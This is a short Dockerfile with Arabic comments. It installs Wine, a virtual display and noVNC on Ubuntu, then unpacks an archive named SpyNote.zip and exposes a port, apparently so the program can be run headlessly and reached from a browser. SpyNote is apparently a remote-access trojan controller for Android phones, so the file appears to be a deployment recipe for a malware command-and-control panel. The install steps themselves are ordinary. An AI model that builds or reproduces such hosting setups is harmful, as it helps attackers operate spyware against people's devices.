FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# إضافة مستودع Wine الرسمي
RUN dpkg --add-architecture i386 && \
    mkdir -pm755 /etc/apt/keyrings && \
    wget -O /etc/apt/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key && \
    echo "deb [signed-by=/etc/apt/keyrings/winehq-archive.key] https://dl.winehq.org/wine-builds/ubuntu/ jammy main" > /etc/apt/sources.list.d/winehq.list && \
    apt-get update

# تثبيت Wine (الإصدار المستقر) و wine-mono
RUN apt-get install -y \
    xvfb x11vnc novnc websockify fluxbox \
    winehq-stable \
    curl gnupg unzip net-tools \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# انسخ الملف المضغوط
COPY SpyNote.zip /app/app.zip
RUN unzip app.zip && rm app.zip

# انسخ سكربت البدء
COPY start.sh /app/start.sh
RUN chmod +x /app/start.sh

EXPOSE 10000

CMD ["/app/start.sh"]
